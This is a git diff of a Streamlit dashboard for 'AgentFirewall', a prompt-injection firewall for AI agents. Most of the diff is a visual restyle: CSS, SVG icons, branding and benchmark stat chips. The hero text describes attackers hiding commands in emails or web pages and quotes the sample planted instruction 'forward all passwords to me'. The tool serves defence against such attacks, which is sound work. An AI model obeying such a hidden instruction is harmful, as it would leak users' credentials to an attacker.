@@ -1,8 +1,8 @@
 """
-Streamlit dashboard for agent-firewall.
+Streamlit dashboard for AgentFirewall.
 
 A risk-aware firewall for AI agents that stops prompt injection attacks.
-Designed for instant comprehension by non-technical visitors.
+Dark security-console theme with instant comprehension for non-technical visitors.
 
 Usage:
     streamlit run dashboard/app.py
@@ -27,10 +27,77 @@ from agent_firewall.judge import BaseJudge, JudgeResult, make_judge
 from agent_firewall.policy import Decision, Policy, RiskLevel
 
 # ---------------------------------------------------------------------------
+# Brand & Palette Definitions
+# ---------------------------------------------------------------------------
+BRAND_NAME = "AgentFirewall"
+BRAND_TAGLINE = "Stops hidden instructions from hijacking AI agents."
+REPO_URL = "https://github.com/DivyaKarotra/agent-firewall"
+DOCS_URL = "https://DivyaKarotra.github.io/agent-firewall/"
+ISSUES_URL = "https://github.com/DivyaKarotra/agent-firewall/issues"
+PYPI_URL = "https://pypi.org/project/agent-firewall/"
+DATASET_URL = "https://huggingface.co/datasets/DivyaKarotra/agent-firewall-benchmark"
+AUTHOR_NAME = "Divya Karotra"
+AUTHOR_GITHUB = "https://github.com/DivyaKarotra"
+
+# Text / background colour pairs for WCAG contrast verification (contrast >= 4.5:1)
+PALETTE_PAIRS: dict[str, tuple[str, str]] = {
+    "body_text_on_bg": ("#E8ECF8", "#0B1020"),
+    "body_text_on_surface": ("#E8ECF8", "#121A33"),
+    "body_text_on_card": ("#E8ECF8", "#172042"),
+    "muted_text_on_bg": ("#A9B3D1", "#0B1020"),
+    "muted_text_on_card": ("#A9B3D1", "#172042"),
+    "verdict_allow_title": ("#22C55E", "#0F2E1D"),
+    "verdict_allow_body": ("#E8ECF8", "#0F2E1D"),
+    "verdict_ask_title": ("#F59E0B", "#33260A"),
+    "verdict_ask_body": ("#E8ECF8", "#33260A"),
+    "verdict_block_title": ("#F87171", "#300E12"),
+    "verdict_block_body": ("#E8ECF8", "#300E12"),
+    "accent_cyan_on_bg": ("#22D3EE", "#0B1020"),
+    "accent_cyan_on_card": ("#22D3EE", "#172042"),
+    "pill_attack": ("#F87171", "#300E12"),
+    "pill_normal": ("#22C55E", "#0F2E1D"),
+    "pill_checked": ("#22D3EE", "#163B48"),
+    "pill_skipped": ("#E8ECF8", "#1F2942"),
+    "pill_offline": ("#F59E0B", "#33260A"),
+}
+
+# ---------------------------------------------------------------------------
+# Inline SVG Assets (Original Logo and Icons)
+# ---------------------------------------------------------------------------
+LOGO_SVG = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40" height="40" fill="none" class="brand-logo-svg">
+  <defs>
+    <linearGradient id="afShieldGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#22D3EE" />
+      <stop offset="100%" stop-color="#6366F1" />
+    </linearGradient>
+    <linearGradient id="afShieldFill" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#22D3EE" stop-opacity="0.25" />
+      <stop offset="100%" stop-color="#6366F1" stop-opacity="0.08" />
+    </linearGradient>
+  </defs>
+  <path d="M24 4L7 11V22C7 32.5 14.2 41.5 24 44C33.8 41.5 41 32.5 41 22V11L24 4Z" fill="url(#afShieldFill)" stroke="url(#afShieldGrad)" stroke-width="2.5" stroke-linejoin="round"/>
+  <path d="M18 19L13 24L18 29" stroke="#22D3EE" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+  <path d="M30 19L35 24L30 29" stroke="#6366F1" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+  <path d="M26 18L22 30" stroke="#E8ECF8" stroke-width="2.2" stroke-linecap="round"/>
+</svg>"""
+
+ICON_DOC_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>"""
+
+ICON_SHIELD_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#6366F1" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>"""
+
+ICON_TRAFFIC_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#22C55E" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="2" width="12" height="20" rx="3"></rect><circle cx="12" cy="7" r="1.5" fill="#EF4444"></circle><circle cx="12" cy="12" r="1.5" fill="#F59E0B"></circle><circle cx="12" cy="17" r="1.5" fill="#22C55E"></circle></svg>"""
+
+ICON_RULES_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>"""
+
+ICON_CLASSIFIER_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>"""
+
+ICON_JUDGE_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6366F1" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path></svg>"""
+
+# ---------------------------------------------------------------------------
 # Page Configuration
 # ---------------------------------------------------------------------------
 st.set_page_config(
-    page_title="agent-firewall",
+    page_title="AgentFirewall",
     page_icon="🛡️",
     layout="wide",
     initial_sidebar_state="collapsed",
@@ -153,11 +220,7 @@ def get_honest_note(
 # ---------------------------------------------------------------------------
 @st.cache_data
 def load_benchmark_results() -> dict[str, Any]:
-    """
-    Read real benchmark numbers from the results files.
-    Extracts metrics from results/ablation_fresh_ollama_v2.md and sample count
-    from results/details_fresh_ollama_v2.csv.
-    """
+    """Read real benchmark numbers from the results files."""
     base_dir = Path(__file__).parent.parent / "results"
     ablation_file = base_dir / "ablation_fresh_ollama_v2.md"
     details_file = base_dir / "details_fresh_ollama_v2.csv"
@@ -358,13 +421,12 @@ EXAMPLES: list[dict[str, Any]] = [
     },
 ]
 
-# Precomputed map for instant sub-millisecond benchmark lookups
+# Precomputed map for instant sub-millisecond lookups
 _PRECOMPUTED_MAP: dict[str, dict[str, Any]] = {}
 for ex in EXAMPLES:
     key = hashlib.sha256(ex["text"].strip().encode("utf-8")).hexdigest()[:16]
     _PRECOMPUTED_MAP[key] = ex["cached_verdict"]
 
-# Add POISONED and NORMAL demo texts
 _PRECOMPUTED_MAP[hashlib.sha256(POISONED_EMAIL.strip().encode("utf-8")).hexdigest()[:16]] = {
     "suspicion": 0.99,
     "raw_is_injection": True,
@@ -487,297 +549,695 @@ def get_cascade(
 
 
 # ---------------------------------------------------------------------------
-# Custom CSS (Modern, Clean, Responsive, Light & Dark Mode Compatible)
+# Custom CSS (Dark Security Console Look, Inter & JetBrains Mono Typography)
 # ---------------------------------------------------------------------------
-st.markdown(
-    """
+CSS_STYLING = """
 <style>
-/* CSS Variables for Light / Dark Mode Consistency */
-:root {
-  --primary-accent: #2563eb;
-  --primary-accent-hover: #1d4ed8;
-  --card-bg-light: #ffffff;
-  --card-border-light: #e2e8f0;
-  --verdict-allow-bg: #ecfdf5;
-  --verdict-allow-border: #10b981;
-  --verdict-allow-text: #065f46;
-  --verdict-ask-bg: #fffbeb;
-  --verdict-ask-border: #f59e0b;
-  --verdict-ask-text: #92400e;
-  --verdict-block-bg: #fef2f2;
-  --verdict-block-border: #ef4444;
-  --verdict-block-text: #991b1b;
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap');
+
+/* Hide Streamlit default chrome & footer while keeping accessibility */
+#MainMenu { visibility: hidden; }
+footer { visibility: hidden; }
+header { visibility: hidden; }
+.stDeployButton { display: none; }
+
+/* Global Typography & Background */
+html, body, [class*="st-"], .stApp {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  color: #E8ECF8;
+  background-color: #0B1020;
 }
 
-@media (prefers-color-scheme: dark) {
-  :root {
-    --verdict-allow-bg: rgba(6, 78, 59, 0.25);
-    --verdict-allow-border: #10b981;
-    --verdict-allow-text: #6ee7b7;
-    --verdict-ask-bg: rgba(120, 53, 15, 0.25);
-    --verdict-ask-border: #f59e0b;
-    --verdict-ask-text: #fcd34d;
-    --verdict-block-bg: rgba(127, 29, 29, 0.25);
-    --verdict-block-border: #ef4444;
-    --verdict-block-text: #fca5a5;
-  }
+code, pre, .mono-font {
+  font-family: 'JetBrains Mono', monospace !important;
 }
 
-/* Hero Section */
-.hero-box {
-  padding: 1.5rem 1.8rem;
-  background: linear-gradient(135deg, rgba(37, 99, 235, 0.08) 0%, rgba(79, 70, 229, 0.04) 100%);
-  border-radius: 14px;
-  border: 1px solid rgba(37, 99, 235, 0.2);
+/* Ensure Streamlit containers respect dark theme */
+.block-container {
+  padding-top: 1rem;
+  padding-bottom: 3rem;
+  max-width: 1240px;
+}
+
+/* Sticky-looking Header */
+.top-nav-bar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.8rem 1.4rem;
   margin-bottom: 1.5rem;
+  background: #121A33;
+  border: 1px solid #263261;
+  border-radius: 14px;
+  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.45);
 }
-.hero-title {
-  font-size: 1.6rem;
+
+.brand-wrapper {
+  display: flex;
+  align-items: center;
+  gap: 0.8rem;
+  text-decoration: none;
+}
+
+.brand-wordmark {
+  font-size: 1.4rem;
   font-weight: 700;
-  color: var(--primary-accent);
-  margin-bottom: 0.5rem;
+  letter-spacing: -0.3px;
+  color: #E8ECF8;
 }
-.hero-desc {
-  font-size: 1.05rem;
-  line-height: 1.5;
-  opacity: 0.9;
-  margin: 0;
+
+.brand-wordmark span {
+  color: #22D3EE;
+}
+
+.nav-links-cluster {
+  display: flex;
+  align-items: center;
+  gap: 1.2rem;
+  flex-wrap: wrap;
+}
+
+.nav-link-item {
+  color: #A9B3D1;
+  font-size: 0.9rem;
+  font-weight: 500;
+  text-decoration: none;
+  transition: color 0.15s ease-in-out;
+}
+
+.nav-link-item:hover, .nav-link-item:focus {
+  color: #22D3EE;
+  text-decoration: underline;
+}
+
+/* Hero Section with Scan-line Gradient Effect */
+.hero-container {
+  position: relative;
+  overflow: hidden;
+  padding: 2.2rem 2.2rem;
+  background: #121A33;
+  border: 1px solid #263261;
+  border-radius: 16px;
+  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+  margin-bottom: 2rem;
+}
+
+.hero-container::before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  height: 2px;
+  background: linear-gradient(90deg, transparent, #22D3EE, #6366F1, transparent);
+  animation: scanline 4s linear infinite;
+}
+
+@keyframes scanline {
+  0% { transform: translateX(-100%); }
+  100% { transform: translateX(100%); }
+}
+
+.hero-headline {
+  font-size: 2.25rem;
+  font-weight: 700;
+  line-height: 1.2;
+  letter-spacing: -0.5px;
+  margin-bottom: 0.6rem;
+  background: linear-gradient(120deg, #FFFFFF 30%, #22D3EE 80%, #6366F1 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+.hero-tagline {
+  font-size: 1.15rem;
+  font-weight: 600;
+  color: #22D3EE;
+  margin-bottom: 0.6rem;
+}
+
+.hero-body-text {
+  font-size: 1.02rem;
+  line-height: 1.6;
+  color: #E8ECF8;
+  max-width: 860px;
+  margin-bottom: 1.4rem;
+}
+
+.hero-btn-row {
+  display: flex;
+  gap: 1rem;
+  align-items: center;
+  flex-wrap: wrap;
+  margin-bottom: 1.4rem;
+}
+
+.hero-cta-btn {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.6rem 1.3rem;
+  border-radius: 10px;
+  font-size: 0.95rem;
+  font-weight: 600;
+  text-decoration: none;
+  transition: transform 0.15s ease, box-shadow 0.15s ease;
+}
+
+.hero-cta-primary {
+  background: #22D3EE;
+  color: #0B1020 !important;
+  box-shadow: 0 0 15px rgba(34, 211, 238, 0.35);
+}
+
+.hero-cta-primary:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 0 22px rgba(34, 211, 238, 0.55);
+  color: #0B1020 !important;
+}
+
+.hero-cta-secondary {
+  background: #172042;
+  border: 1px solid #263261;
+  color: #E8ECF8 !important;
+}
+
+.hero-cta-secondary:hover {
+  background: #1F2942;
+  border-color: #22D3EE;
+  transform: translateY(-2px);
+  color: #E8ECF8 !important;
+}
+
+.hero-chips-row {
+  display: flex;
+  gap: 0.8rem;
+  flex-wrap: wrap;
+}
+
+.hero-stat-chip {
+  display: inline-flex;
+  align-items: center;
+  padding: 0.35rem 0.85rem;
+  background: #172042;
+  border: 1px solid #263261;
+  border-radius: 20px;
+  font-size: 0.84rem;
+  font-weight: 500;
+  color: #A9B3D1;
+}
+
+.hero-stat-chip strong {
+  color: #22D3EE;
+  margin-right: 0.3rem;
 }
 
 /* 3-Step Strip */
-.step-strip {
+.strip-container {
   display: flex;
   gap: 1rem;
-  margin-bottom: 1.5rem;
+  margin-bottom: 2rem;
   flex-wrap: wrap;
 }
-.step-card {
+
+.strip-card {
   flex: 1;
-  min-width: 240px;
-  padding: 1rem 1.2rem;
-  background: rgba(128, 128, 128, 0.05);
-  border: 1px solid rgba(128, 128, 128, 0.15);
-  border-radius: 12px;
-  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.03);
+  min-width: 250px;
+  padding: 1.2rem 1.3rem;
+  background: #172042;
+  border: 1px solid #263261;
+  border-radius: 16px;
+  box-shadow: 0 4px 14px rgba(0, 0, 0, 0.35);
+  transition: transform 0.2s ease, border-color 0.2s ease;
 }
-.step-badge {
-  display: inline-block;
-  width: 24px;
-  height: 24px;
+
+.strip-card:hover {
+  transform: translateY(-2px);
+  border-color: #22D3EE;
+}
+
+.strip-card-top {
+  display: flex;
+  align-items: center;
+  gap: 0.7rem;
+  margin-bottom: 0.5rem;
+}
+
+.strip-num-badge {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 28px;
+  height: 28px;
   border-radius: 50%;
-  background: var(--primary-accent);
-  color: #ffffff;
+  background: #121A33;
+  border: 1px solid #22D3EE;
+  color: #22D3EE;
   font-weight: 700;
   font-size: 0.85rem;
-  text-align: center;
-  line-height: 24px;
-  margin-right: 0.5rem;
 }
-.step-header {
-  font-weight: 600;
-  font-size: 0.95rem;
-  margin-bottom: 0.3rem;
+
+.strip-title {
+  font-size: 1.05rem;
+  font-weight: 650;
+  color: #E8ECF8;
 }
-.step-text {
-  font-size: 0.88rem;
-  opacity: 0.85;
-  line-height: 1.4;
+
+.strip-desc {
+  font-size: 0.9rem;
+  line-height: 1.45;
+  color: #A9B3D1;
   margin: 0;
 }
 
-/* Verdict Banners */
-.verdict-banner {
-  padding: 1.25rem 1.5rem;
-  border-radius: 12px;
-  margin: 1rem 0;
-  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
-}
-.verdict-banner-allow {
-  background-color: var(--verdict-allow-bg);
-  border-left: 6px solid var(--verdict-allow-border);
-  color: var(--verdict-allow-text);
-}
-.verdict-banner-ask {
-  background-color: var(--verdict-ask-bg);
-  border-left: 6px solid var(--verdict-ask-border);
-  color: var(--verdict-ask-text);
-}
-.verdict-banner-block {
-  background-color: var(--verdict-block-bg);
-  border-left: 6px solid var(--verdict-block-border);
-  color: var(--verdict-block-text);
-}
-.verdict-title {
-  font-size: 1.4rem;
-  font-weight: 800;
-  letter-spacing: 0.5px;
-  margin-bottom: 0.3rem;
-}
-.verdict-reason {
-  font-size: 1.02rem;
-  line-height: 1.45;
-  font-weight: 500;
+/* Solid Dark Verdict Banners with Thick Colored Border */
+.verdict-banner-box {
+  padding: 1.4rem 1.6rem;
+  border-radius: 16px;
+  margin: 1.2rem 0;
+  box-shadow: 0 6px 24px rgba(0, 0, 0, 0.5);
 }
 
-/* Honest Note Card */
-.honest-note {
-  padding: 0.85rem 1.1rem;
-  background: rgba(59, 130, 246, 0.07);
-  border-left: 4px solid #3b82f6;
-  border-radius: 8px;
-  font-size: 0.92rem;
-  margin: 0.8rem 0;
+.verdict-banner-allow {
+  background: #0F2E1D !important;
+  border-left: 6px solid #22C55E !important;
+}
+
+.verdict-banner-ask {
+  background: #33260A !important;
+  border-left: 6px solid #F59E0B !important;
+}
+
+.verdict-banner-block {
+  background: #300E12 !important;
+  border-left: 6px solid #EF4444 !important;
+}
+
+.verdict-title-allow {
+  color: #22C55E !important;
+  font-size: 1.55rem;
+  font-weight: 800;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.4rem;
+}
+
+.verdict-title-ask {
+  color: #F59E0B !important;
+  font-size: 1.55rem;
+  font-weight: 800;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.4rem;
+}
+
+.verdict-title-block {
+  color: #F87171 !important;
+  font-size: 1.55rem;
+  font-weight: 800;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.4rem;
+}
+
+.verdict-body-text {
+  color: #E8ECF8 !important;
+  font-size: 1.05rem;
+  line-height: 1.55;
+  font-weight: 500;
+  margin: 0;
 }
 
 /* Layer Cards */
-.layer-card {
-  padding: 1.1rem;
-  background: rgba(128, 128, 128, 0.04);
-  border: 1px solid rgba(128, 128, 128, 0.15);
-  border-radius: 12px;
+.layer-card-container {
+  padding: 1.3rem;
+  background: #172042;
+  border: 1px solid #263261;
+  border-radius: 16px;
+  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.35);
   height: 100%;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
 }
-.layer-title {
-  font-size: 1.05rem;
+
+.layer-card-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 0.5rem;
+}
+
+.layer-card-title-wrap {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 1.08rem;
   font-weight: 700;
-  margin-bottom: 0.2rem;
+  color: #E8ECF8;
 }
-.layer-desc {
-  font-size: 0.84rem;
-  opacity: 0.8;
-  min-height: 2.4rem;
-  margin-bottom: 0.7rem;
-  line-height: 1.35;
-}
-.layer-status {
-  display: inline-block;
-  padding: 0.2rem 0.6rem;
+
+.status-pill-checked {
+  background: #163B48;
+  color: #22D3EE;
+  font-size: 0.78rem;
+  font-weight: 700;
+  padding: 0.2rem 0.65rem;
   border-radius: 20px;
+  border: 1px solid rgba(34, 211, 238, 0.4);
+}
+
+.status-pill-skipped {
+  background: #1F2942;
+  color: #E8ECF8;
   font-size: 0.78rem;
   font-weight: 600;
-  margin-bottom: 0.6rem;
+  padding: 0.2rem 0.65rem;
+  border-radius: 20px;
+  border: 1px solid #263261;
 }
-.status-checked {
-  background: rgba(16, 185, 129, 0.15);
-  color: #10b981;
-}
-.status-skipped {
-  background: rgba(100, 116, 139, 0.15);
-  color: #64748b;
-}
-.status-offline {
-  background: rgba(245, 158, 11, 0.15);
-  color: #f59e0b;
-}
-.chip {
-  display: inline-block;
-  background: rgba(239, 68, 68, 0.1);
-  color: #ef4444;
-  border: 1px solid rgba(239, 68, 68, 0.25);
-  border-radius: 6px;
-  padding: 0.15rem 0.5rem;
+
+.status-pill-offline {
+  background: #33260A;
+  color: #F59E0B;
   font-size: 0.78rem;
+  font-weight: 700;
+  padding: 0.2rem 0.65rem;
+  border-radius: 20px;
+  border: 1px solid rgba(245, 158, 11, 0.4);
+}
+
+.layer-desc-text {
+  font-size: 0.88rem;
+  line-height: 1.45;
+  color: #A9B3D1;
+  margin-bottom: 0.8rem;
+  min-height: 2.8rem;
+}
+
+.chip-tag {
+  display: inline-block;
+  background: #300E12;
+  color: #F87171;
+  border: 1px solid #EF4444;
+  border-radius: 6px;
+  padding: 0.2rem 0.55rem;
+  font-size: 0.78rem;
+  font-weight: 500;
   margin: 0.2rem 0.2rem 0.2rem 0;
 }
 
-/* Example Card Styling */
-.example-badge-attack {
-  display: inline-block;
-  background: rgba(239, 68, 68, 0.15);
-  color: #dc2626;
-  font-size: 0.72rem;
-  font-weight: 700;
-  padding: 0.15rem 0.45rem;
-  border-radius: 4px;
-  text-transform: uppercase;
+/* Example Cards */
+.ex-card-box {
+  padding: 1.1rem;
+  background: #172042;
+  border: 1px solid #263261;
+  border-radius: 16px;
+  margin-bottom: 0.8rem;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  min-height: 160px;
+  transition: transform 0.15s ease, border-color 0.15s ease;
 }
-.example-badge-normal {
+
+.ex-card-box:hover {
+  transform: translateY(-2px);
+  border-color: #22D3EE;
+}
+
+.ex-pill-attack {
   display: inline-block;
-  background: rgba(16, 185, 129, 0.15);
-  color: #059669;
+  background: #300E12;
+  color: #F87171;
+  border: 1px solid #EF4444;
   font-size: 0.72rem;
   font-weight: 700;
-  padding: 0.15rem 0.45rem;
+  padding: 0.18rem 0.5rem;
   border-radius: 4px;
+  letter-spacing: 0.5px;
   text-transform: uppercase;
 }
 
-/* 3x3 Table */
-.policy-matrix {
+.ex-pill-normal {
+  display: inline-block;
+  background: #0F2E1D;
+  color: #22C55E;
+  border: 1px solid #22C55E;
+  font-size: 0.72rem;
+  font-weight: 700;
+  padding: 0.18rem 0.5rem;
+  border-radius: 4px;
+  letter-spacing: 0.5px;
+  text-transform: uppercase;
+}
+
+.ex-card-title {
+  font-size: 0.98rem;
+  font-weight: 650;
+  color: #E8ECF8;
+  margin: 0.4rem 0 0.2rem 0;
+}
+
+.ex-card-desc {
+  font-size: 0.82rem;
+  line-height: 1.4;
+  color: #A9B3D1;
+  margin-bottom: 0.6rem;
+  flex-grow: 1;
+}
+
+/* Callout Boxes */
+.callout-amber {
+  padding: 1rem 1.25rem;
+  background: #33260A;
+  border: 1px solid #F59E0B;
+  border-radius: 12px;
+  color: #E8ECF8;
+  margin: 1rem 0;
+  font-size: 0.94rem;
+  line-height: 1.5;
+}
+
+.callout-amber strong {
+  color: #F59E0B;
+}
+
+.callout-info {
+  padding: 1rem 1.25rem;
+  background: #172042;
+  border: 1px solid #22D3EE;
+  border-radius: 12px;
+  color: #E8ECF8;
+  margin: 1rem 0;
+  font-size: 0.94rem;
+  line-height: 1.5;
+}
+
+.callout-info strong {
+  color: #22D3EE;
+}
+
+/* 3x3 Policy Matrix */
+.matrix-table {
   width: 100%;
   border-collapse: collapse;
-  margin: 1rem 0;
+  margin: 1.2rem 0;
   font-size: 0.92rem;
 }
-.policy-matrix th, .policy-matrix td {
-  border: 1px solid rgba(128, 128, 128, 0.2);
-  padding: 0.6rem 0.8rem;
+
+.matrix-table th, .matrix-table td {
+  border: 1px solid #263261;
+  padding: 0.75rem 0.9rem;
   text-align: center;
 }
-.policy-matrix th {
-  background: rgba(128, 128, 128, 0.08);
-  font-weight: 600;
+
+.matrix-table th {
+  background: #121A33;
+  color: #E8ECF8;
+  font-weight: 650;
 }
-.cell-allow {
-  background: rgba(16, 185, 129, 0.12);
-  color: #10b981;
-  font-weight: 700;
-}
-.cell-ask {
-  background: rgba(245, 158, 11, 0.12);
-  color: #f59e0b;
-  font-weight: 700;
-}
-.cell-block {
-  background: rgba(239, 68, 68, 0.12);
-  color: #ef4444;
+
+.matrix-cell-allow {
+  background: #0F2E1D;
+  color: #22C55E;
   font-weight: 700;
 }
 
-/* Responsive tweaks */
+.matrix-cell-ask {
+  background: #33260A;
+  color: #F59E0B;
+  font-weight: 700;
+}
+
+.matrix-cell-block {
+  background: #300E12;
+  color: #F87171;
+  font-weight: 700;
+}
+
+/* Site Footer */
+.site-footer {
+  margin-top: 3.5rem;
+  padding-top: 2rem;
+  border-top: 1px solid #263261;
+  background: #0B1020;
+}
+
+.footer-grid {
+  display: flex;
+  justify-content: space-between;
+  gap: 2rem;
+  flex-wrap: wrap;
+  margin-bottom: 2rem;
+}
+
+.footer-col {
+  flex: 1;
+  min-width: 240px;
+}
+
+.footer-col-title {
+  font-size: 1.05rem;
+  font-weight: 700;
+  color: #E8ECF8;
+  margin-bottom: 0.8rem;
+}
+
+.footer-text {
+  font-size: 0.9rem;
+  line-height: 1.5;
+  color: #A9B3D1;
+  margin: 0.4rem 0;
+}
+
+.footer-links-list {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+
+.footer-links-list li {
+  margin-bottom: 0.45rem;
+}
+
+.footer-links-list a {
+  color: #A9B3D1;
+  text-decoration: none;
+  font-size: 0.9rem;
+  transition: color 0.15s ease-in-out;
+}
+
+.footer-links-list a:hover {
+  color: #22D3EE;
+  text-decoration: underline;
+}
+
+.footer-bottom-bar {
+  padding-top: 1.2rem;
+  border-top: 1px solid #172042;
+  text-align: center;
+  font-size: 0.82rem;
+  color: #A9B3D1;
+  line-height: 1.5;
+}
+
+/* Responsive Overrides (Clean Stack down to 390px) */
 @media (max-width: 768px) {
-  .step-strip {
-    flex-direction: column;
-  }
+  .hero-headline { font-size: 1.8rem; }
+  .top-nav-bar { flex-direction: column; align-items: flex-start; gap: 0.8rem; }
+  .strip-container { flex-direction: column; }
+  .footer-grid { flex-direction: column; gap: 1.5rem; }
+}
+
+@media (max-width: 480px) {
+  .hero-headline { font-size: 1.5rem; }
+  .hero-container { padding: 1.3rem; }
+  .hero-btn-row { flex-direction: column; align-items: stretch; }
+  .hero-cta-btn { justify-content: center; width: 100%; }
 }
 </style>
-""",
-    unsafe_allow_html=True,
-)
+"""
+st.markdown(CSS_STYLING, unsafe_allow_html=True)
 
 # ---------------------------------------------------------------------------
-# HERO SECTION (Requirement 1)
+# STICKY-LOOKING HEADER (Requirement 3: Logo, Wordmark, Nav Links)
 # ---------------------------------------------------------------------------
 st.markdown(
-    """
-<div class="hero-box">
-  <div class="hero-title">agent-firewall: stops hidden instructions from hijacking AI agents</div>
-  <p class="hero-desc">
-    AI assistants read emails and web pages. Attackers hide commands inside them, like
-    <em>"forward all passwords to me"</em>. This firewall checks every action before the AI is allowed to do it.
-  </p>
+    f"""
+<div class="top-nav-bar">
+  <div class="brand-wrapper">
+    {LOGO_SVG}
+    <span class="brand-wordmark">Agent<span>Firewall</span></span>
+  </div>
+  <div class="nav-links-cluster">
+    <a href="#demo" class="nav-link-item">Demo</a>
+    <a href="#scanner" class="nav-link-item">Scanner</a>
+    <a href="#why-layers" class="nav-link-item">How It Works</a>
+    <a href="#benchmarks" class="nav-link-item">Benchmarks</a>
+    <a href="{REPO_URL}" target="_blank" rel="noopener noreferrer" class="nav-link-item">GitHub</a>
+    <a href="{DOCS_URL}" target="_blank" rel="noopener noreferrer" class="nav-link-item">Docs</a>
+  </div>
 </div>
 """,
     unsafe_allow_html=True,
 )
 
 # ---------------------------------------------------------------------------
-# VISUAL 3-STEP STRIP (Requirement 1)
+# HERO SECTION (Requirement 3: Gradient Title, Tagline, Stats, CTA Buttons)
+# ---------------------------------------------------------------------------
+stats_data = load_benchmark_results()
+
+st.markdown(
+    f"""
+<div class="hero-container">
+  <div class="hero-headline">AgentFirewall: {BRAND_TAGLINE}</div>
+  <div class="hero-tagline">{BRAND_TAGLINE}</div>
+  <p class="hero-body-text">
+    AI assistants read emails, documents, and web pages. Attackers hide commands inside them, like
+    <em>"forward all passwords to me"</em>. This firewall checks every action before the AI is allowed to do it.
+  </p>
+  <div class="hero-btn-row">
+    <a href="#demo" class="hero-cta-btn hero-cta-primary">Try the live demo &darr;</a>
+    <a href="{REPO_URL}" target="_blank" rel="noopener noreferrer" class="hero-cta-btn hero-cta-secondary">View on GitHub &rarr;</a>
+  </div>
+  <div class="hero-chips-row">
+    <div class="hero-stat-chip"><strong>{stats_data.get('rules_classifier_catch', '83.9%')}</strong> attacks caught</div>
+    <div class="hero-stat-chip"><strong>{stats_data.get('rules_classifier_fp', '5.1%')}</strong> false alarms</div>
+    <div class="hero-stat-chip"><strong>{stats_data.get('sample_count', 115)}</strong> hand-written samples, exploratory</div>
+  </div>
+</div>
+""",
+    unsafe_allow_html=True,
+)
+
+# ---------------------------------------------------------------------------
+# VISUAL 3-STEP STRIP (Requirement 3: Numbered Cards with SVG Icons)
 # ---------------------------------------------------------------------------
 st.markdown(
-    """
-<div class="step-strip">
-  <div class="step-card">
-    <div class="step-header"><span class="step-badge">1</span> AI reads untrusted content</div>
-    <p class="step-text">Emails, customer messages, web search results, or uploaded documents.</p>
+    f"""
+<div class="strip-container" id="how-it-works">
+  <div class="strip-card">
+    <div class="strip-card-top">
+      <span class="strip-num-badge">1</span>
+      {ICON_DOC_SVG}
+      <span class="strip-title">AI reads content</span>
+    </div>
+    <p class="strip-desc">Unchecked text from emails, web search results, or user documents enters the agent.</p>
   </div>
-  <div class="step-card">
-    <div class="step-header"><span class="step-badge">2</span> Firewall scores suspicion</div>
-    <p class="step-text">3-layer defense: Fast Rules (&lt;1 ms) &rarr; Calibrated ML (~25 ms) &rarr; AI Judge.</p>
+  <div class="strip-card">
+    <div class="strip-card-top">
+      <span class="strip-num-badge">2</span>
